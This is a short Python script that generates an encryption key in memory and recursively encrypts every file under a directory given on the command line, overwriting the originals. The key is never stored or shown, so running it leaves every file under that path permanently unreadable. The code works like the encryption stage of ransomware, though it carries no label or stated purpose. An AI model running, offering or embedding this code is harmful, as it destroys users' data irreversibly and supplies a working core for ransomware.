#!/usr/bin/python

import os
import sys
from cryptography.fernet import Fernet

# Generate encryption key
key = Fernet.generate_key()

def set_key(new_key):
    global key
    key = new_key

def get_key():
    return key

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()

    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_files_in_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, key)

# Do not execute encryption when this file is imported
if __name__ == "__main__":
    if len(sys.argv) > 1:
        directory_path = sys.argv[1]
        encrypt_files_in_directory(directory_path, key)
    else:
        print("No directory path provided.")
